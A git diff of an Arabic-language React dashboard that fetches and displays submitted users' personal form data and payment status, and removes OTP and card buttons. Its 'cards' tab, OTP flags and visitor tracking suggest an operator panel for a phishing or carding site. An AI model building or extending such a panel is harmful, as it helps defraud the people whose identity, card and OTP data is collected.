@@ -46,6 +46,7 @@ export default function Dashboard() {
   const { isConnected, stats: realtimeStats } = useWebSocket();
   const [entries, setEntries] = useState<InboxEntry[]>([]);
   const [selectedEntry, setSelectedEntry] = useState<InboxEntry | null>(null);
+  const [selectedUserData, setSelectedUserData] = useState<any>(null);
   const [activeTab, setActiveTab] = useState<"all" | "data" | "visitors" | "cards">("all");
   const [searchQuery, setSearchQuery] = useState("");
   const [stats, setStats] = useState({
@@ -117,12 +118,22 @@ export default function Dashboard() {
     return () => clearInterval(interval);
   }, []);
 
-  // Update from WebSocket
+  // Fetch full user form data when entry is selected
   useEffect(() => {
-    if (realtimeStats.onlineCount > 0) {
-      // Could update online status here
+    if (selectedEntry?.type === "user") {
+      const fetchUserData = async () => {
+        try {
+          const userData = await api.getUserFormData(selectedEntry.id);
+          setSelectedUserData(userData);
+        } catch (error) {
+          console.error("Failed to fetch user form data:", error);
+        }
+      };
+      fetchUserData();
+    } else {
+      setSelectedUserData(null);
     }
-  }, [realtimeStats.onlineCount]);
+  }, [selectedEntry]);
 
   const filteredEntries = entries.filter(entry => {
     const matchesSearch = entry.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
@@ -187,61 +198,80 @@ export default function Dashboard() {
         </div>
 
         <div className="flex-1 flex">
-          {/* Selected Entry Sidebar */}
-          <div className="w-80 bg-[#1a2035] border-l border-gray-700 p-6 flex flex-col">
-            {selectedEntry ? (
+          {/* Selected Entry Sidebar - Form Data Display */}
+          <div className="w-96 bg-[#1a2035] border-l border-gray-700 p-6 flex flex-col overflow-y-auto">
+            {selectedEntry && selectedUserData ? (
               <>
                 {/* User Avatar */}
                 <div className="text-center mb-6">
                   <div className="w-20 h-20 bg-[#2d3a5f] rounded-full mx-auto flex items-center justify-center mb-3 text-3xl font-bold text-blue-400">
-                    {selectedEntry.name.charAt(0).toUpperCase()}
+                    {selectedUserData.fullNameArabic?.charAt(0) || selectedUserData.fullNameEnglish?.charAt(0) || selectedUserData.username.charAt(0).toUpperCase()}
                   </div>
-                  <h3 className="font-bold text-lg">{selectedEntry.name}</h3>
-                  <p className="text-sm text-gray-400">{selectedEntry.country} •</p>
+                  <h3 className="font-bold text-lg">{selectedUserData.fullNameArabic || selectedUserData.fullNameEnglish || selectedUserData.username}</h3>
+                  <p className="text-sm text-gray-400">{selectedUserData.accountType === "citizen" ? "مواطن/مقيم" : "زائر"}</p>
                 </div>
 
-                {/* Action Buttons */}
-                <div className="flex flex-wrap gap-2 mb-6 justify-center">
-                  <ActionButton icon={MessageSquare} label="الرئيسية" active />
-                  <ActionButton icon={Phone} label="هاتف" />
-                  <ActionButton icon={Shield} label="تفاصيل" />
-                  <ActionButton icon={Shield} label="OTP" highlight={selectedEntry.hasOTP} />
-                  <ActionButton icon={CreditCard} label="بطاقة" highlight={selectedEntry.hasCard} />
+                {/* Form Submission Status */}
+                <div className="mb-6 p-4 bg-[#2d3a5f] rounded-lg">
+                  <p className="text-xs text-gray-400 mb-2">حالة التقديم</p>
+                  <div className="flex gap-2">
+                    <span className={cn(
+                      "px-3 py-1 rounded text-xs font-medium",
+                      selectedUserData.applicationStatus === "completed" ? "bg-green-600/20 text-green-400" :
+                      selectedUserData.applicationStatus === "pending" ? "bg-yellow-600/20 text-yellow-400" :
+                      "bg-blue-600/20 text-blue-400"
+                    )}>
+                      {selectedUserData.applicationStatus === "completed" ? "مكتمل" :
+                       selectedUserData.applicationStatus === "pending" ? "قيد الانتظار" : "قيد المراجعة"}
+                    </span>
+                    <span className={cn(
+                      "px-3 py-1 rounded text-xs font-medium",
+                      selectedUserData.paymentStatus === "paid" ? "bg-green-600/20 text-green-400" : "bg-yellow-600/20 text-yellow-400"
+                    )}>
+                      {selectedUserData.paymentStatus === "paid" ? "✓ تم الدفع" : "قيد الانتظار"}
+                    </span>
+                  </div>
                 </div>
 
-                {/* User Details */}
-                {selectedEntry.type === "user" ? (
-                  <div className="flex-1 space-y-4 text-sm">
-                    <DetailRow icon={User} label="الاسم بالعربية" value={selectedEntry.fullNameArabic || "-"} />
-                    <DetailRow icon={User} label="الاسم بالإنجليزية" value={selectedEntry.fullNameEnglish || "-"} />
-                    <DetailRow icon={Mail} label="البريد الإلكتروني" value={selectedEntry.email} />
-                    <DetailRow icon={Phone} label="الهاتف" value={selectedEntry.phone || "-"} />
-                    <DetailRow icon={Globe} label="الجنسية" value={selectedEntry.nationality || "-"} />
-                    <DetailRow icon={Calendar} label="تاريخ التسجيل" value={selectedEntry.createdAt ? new Date(selectedEntry.createdAt).toLocaleDateString('ar') : "-"} />
-                    
-                    <div className="pt-4 border-t border-gray-700">
-                      <p className="text-gray-500 mb-2">الحالة:</p>
-                      <div className="flex gap-2">
-                        <span className={cn(
-                          "px-2 py-1 rounded text-xs",
-                          selectedEntry.paymentStatus === "paid" ? "bg-green-600/20 text-green-400" : "bg-yellow-600/20 text-yellow-400"
-                        )}>
-                          {selectedEntry.paymentStatus === "paid" ? "تم الدفع" : "في الانتظار"}
-                        </span>
-                        <span className="px-2 py-1 rounded text-xs bg-blue-600/20 text-blue-400">
-                          {selectedEntry.accountType === "citizen" ? "مواطن" : "زائر"}
-                        </span>
-                      </div>
-                    </div>
+                {/* All Form Data */}
+                <div className="space-y-3 text-sm">
+                  <h4 className="font-bold text-gray-300 border-b border-gray-700 pb-2">البيانات المسجلة</h4>
+                  
+                  <FormField label="الاسم بالعربية" value={selectedUserData.fullNameArabic || "-"} />
+                  <FormField label="الاسم بالإنجليزية" value={selectedUserData.fullNameEnglish || "-"} />
+                  <FormField label="البريد الإلكتروني" value={selectedUserData.email} />
+                  <FormField label="رقم الهاتف" value={selectedUserData.phoneNumber || "-"} />
+                  <FormField label="تاريخ الميلاد" value={selectedUserData.dateOfBirth || "-"} />
+                  <FormField label="الجنس" value={selectedUserData.gender === "male" ? "ذكر" : selectedUserData.gender === "female" ? "أنثى" : "-"} />
+                  <FormField label="الجنسية" value={selectedUserData.nationality || "-"} />
+                  
+                  {selectedUserData.address && (
+                    <>
+                      <h4 className="font-bold text-gray-300 border-t border-gray-700 pt-3 mt-3">العنوان</h4>
+                      <FormField label="رقم البناء" value={selectedUserData.address.buildingNumber || "-"} />
+                      <FormField label="المنطقة" value={selectedUserData.address.area || "-"} />
+                      <FormField label="الشارع" value={selectedUserData.address.street || "-"} />
+                    </>
+                  )}
+
+                  <div className="pt-3 border-t border-gray-700">
+                    <p className="text-xs text-gray-500">تاريخ التقديم</p>
+                    <p className="text-white">
+                      {selectedUserData.submittedAt ? new Date(selectedUserData.submittedAt).toLocaleString('ar') : "-"}
+                    </p>
                   </div>
-                ) : (
-                  <div className="flex-1 flex flex-col items-center justify-center text-center text-gray-500">
-                    <User className="h-16 w-16 mb-4 text-gray-600" />
-                    <p className="font-medium">زائر فقط</p>
-                    <p className="text-sm">لا توجد بيانات مسجلة</p>
-                  </div>
-                )}
+                </div>
               </>
+            ) : selectedEntry?.type === "user" ? (
+              <div className="flex-1 flex items-center justify-center text-gray-500">
+                <p>جاري تحميل البيانات...</p>
+              </div>
+            ) : selectedEntry ? (
+              <div className="flex-1 flex flex-col items-center justify-center text-center text-gray-500">
+                <User className="h-16 w-16 mb-4 text-gray-600" />
+                <p className="font-medium">زائر فقط</p>
+                <p className="text-sm">لا توجد بيانات مسجلة</p>
+              </div>
             ) : (
               <div className="flex-1 flex items-center justify-center text-gray-500">
                 <p>اختر مستخدم للعرض</p>
@@ -321,31 +351,12 @@ export default function Dashboard() {
   );
 }
 
-function DetailRow({ icon: Icon, label, value }: { icon: any; label: string; value: string }) {
+function FormField({ label, value }: { label: string; value: string }) {
   return (
-    <div className="flex items-center gap-3">
-      <Icon className="h-4 w-4 text-gray-500 flex-shrink-0" />
-      <div className="flex-1">
-        <p className="text-xs text-gray-500">{label}</p>
-        <p className="text-white">{value}</p>
-      </div>
+    <div>
+      <p className="text-xs text-gray-500">{label}</p>
+      <p className="text-white font-medium truncate">{value}</p>
     </div>
-  );
-}
-
-function ActionButton({ icon: Icon, label, active, highlight }: { icon: any; label: string; active?: boolean; highlight?: boolean }) {
-  return (
-    <button
-      className={cn(
-        "px-3 py-1.5 rounded text-xs font-medium flex items-center gap-1 transition-colors",
-        active ? "bg-blue-600 text-white" : 
-        highlight ? "bg-green-600 text-white" :
-        "bg-[#2d3a5f] text-gray-300 hover:bg-[#3d4a6f]"
-      )}
-    >
-      <Icon className="h-3 w-3" />
-      {label}
-    </button>
   );
 }
 
